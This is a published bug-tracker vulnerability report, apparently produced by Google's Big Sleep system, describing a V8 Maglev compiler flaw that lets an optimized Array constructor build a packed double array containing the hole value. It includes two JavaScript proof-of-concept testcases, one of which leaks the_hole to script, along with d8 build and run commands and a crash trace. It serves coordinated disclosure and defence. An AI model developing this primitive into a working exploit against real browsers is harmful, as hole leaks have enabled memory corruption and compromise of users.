# 457989902

Issue URL: https://issuetracker.google.com/issues/457989902
VRP-Reward: INT
Date: Nov 5, 2025 09:01PM


_Publishing the original report in line with the disclosure policy._

* * *

We are tracking this issue with the public ID `BIGSLEEP-457989902`. Please use this identifier for reference in any future communication.

## **Vulnerability Details**

Since commit `006fd6637119ca51e48e33c600cb173957b76712` [1], the Maglev compiler is able to inline the `Array` constructor for double elements. This allows Maglev to emit optimized code for creating `JSArray` objects of (for example) type PACKED_DOUBLE_ELEMENTS.

When storing elements into a PACKED_DOUBLE_ELEMENTS, the implementation needs to ensure not to store a NaN value with the magic `the_hole` pattern [2], as these must only appear in HOLEY_DOUBLE_ELEMENTS. However, it appears that the new optimization in Maglev fails to ensure this and can therefore be tricked into creating a PACKED_DOUBLE_ELEMENTS array that contains a hole. This then violates internal engine invariants as can be observed with the testcase below, which results in a dcheck failure in the optimized code path for the Array.join operation.

It appears to be possible to turn this inconsistency into a hole leak primitive, for example by using `.unshift` on the resulting array as demonstrated by the second testcase. As hole leaks have been exploitable in the past, we’re reporting this issue as a high-severity vulnerability, although recent hardening around hole leaks [3] may affect the exploitability of this bug.

[1] [https://chromium.googlesource.com/v8/v8.git/+/006fd6637119ca51e48e33c600cb173957b76712](<https://chromium.googlesource.com/v8/v8.git/+/006fd6637119ca51e48e33c600cb173957b76712>)  
[2] [https://source.chromium.org/chromium/chromium/src/+/main:v8/src/common/globals.h;l=2026;drc=2bf36e101794fe961ac3983fad216708d4254c21](<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/common/globals.h;l=2026;drc=2bf36e101794fe961ac3983fad216708d4254c21>)  
[3] [https://crbug.com/434179415](<https://crbug.com/434179415>)

## **Affected Version(s)**

The issue has been successfully reproduced:

  * at HEAD (commit `7cacf0331ea3a79ca5f5b2587358de213fc36d6d`)

  * in beta release 14.3.127.1 (commit `d1daf8a40db207b2217bd5c90ffa8acc14e0823b`)

Note that the current stable release does not yet appear to be affected by this bug.

## **Reproduction**

### **Test Cases**

```
// Minimal testcase to cause a dcheck failure
function createArray(x) {
  return new Array(x, 1.1);
}

let dv = new DataView(new ArrayBuffer(8));
dv.setUint32(0, 0xFFF7FFFF, true);
dv.setUint32(4, 0xFFF7FFFF, true);
let x = dv.getFloat64(0, true);
%PrepareFunctionForOptimization(createArray);
createArray(x);
%OptimizeMaglevOnNextCall(createArray);
let arr = createArray(x);
//%DebugPrint(arr);
print(arr);
```

```
// Testcase that leaks the_hole value to JavaScript
function createArray(x) {
  return new Array(x, 1.1);
}

let dv = new DataView(new ArrayBuffer(8));
dv.setUint32(0, 0xFFF7FFFF, true);
dv.setUint32(4, 0xFFF7FFFF, true);
let x = dv.getFloat64(0, true);
%PrepareFunctionForOptimization(createArray);
createArray(x);
%OptimizeMaglevOnNextCall(createArray);
let arr = createArray(x);

arr.unshift(arr);
let hole = arr[1];
%DebugPrint(hole);
```

### **Build Instructions**

Follow the instructions at [https://v8.dev/docs/build](<https://v8.dev/docs/build>). The crash was verified on a debug build:

```
gm.py x64.debug
```

### **Command**

```
./out/x64.debug/d8 --allow-natives-syntax crash.js
```

### **Crash Report**

```
abort: CSA_DCHECK failed: Torque assert '!this.is_hole' failed [src/builtins/base.tq:204] [../../src/builtins/array-join.tq:823]

Stacktrace:
    ptr0=0x53700137695
    ptr1=0xfa40000cf00
    ptr2=(nil)
    ptr3=(nil)
    ptr4=(nil)
    ptr5=(nil)
    failure_message_object=0x7fff907cf800

==== JS stack trace =========================================

    0: ExitFrame [pc: 0x7f69df28693d]
    1: StubFrame [pc: 0x7f69df410f7d]
    2: join [0x5370081ba1d](this=0x05370084a22d <JSArray[2]>)
    3: toString [0x5370081594d](this=0x05370084a22d <JSArray[2]>)
    4: InternalFrame [pc: 0x7f69ded0c6e7]
    5: EntryFrame [pc: 0x7f69ded0c42b]
    6: ApiCallbackExitFrame print(this=0x0537008136c5 <JSGlobalProxy>,0x05370084a22d <JSArray[2]>)

    7: run [0x5370082ca05] [crash.js:17] [bytecode=0x230008000ed offset=131](this=0x0537008136c5 <JSGlobalProxy>)
    8: /* anonymous */ [0x5370082c981] [crash.js:19] [bytecode=0x2300080008d offset=15](this=0x0537008136c5 <JSGlobalProxy>)
    9: InternalFrame [pc: 0x7f69ded0c6e7]
   10: EntryFrame [pc: 0x7f69ded0c42b]
```

## **Reporter Credit**

Google Big Sleep

## **Disclosure Policy**

This bug is subject to a 90-day disclosure deadline. If a fix for this issue is made available to users before the end of the 90-day deadline, this bug report will become public 30 days after the fix was made available. Otherwise, this bug report will become public at the deadline. The scheduled deadline is `2026-02-03`.

For more information, visit [https://goo.gle/bigsleep](<https://goo.gle/bigsleep>)


---

**#2 — sa...@google.com — Dec 19, 2025 08:56PM**

Fixed in [https://chromereleases.googleblog.com/2025/12/stable-channel-update-for-desktop.html](<https://chromereleases.googleblog.com/2025/12/stable-channel-update-for-desktop.html>). The bug only affected a beta release so no CVE was assigned.
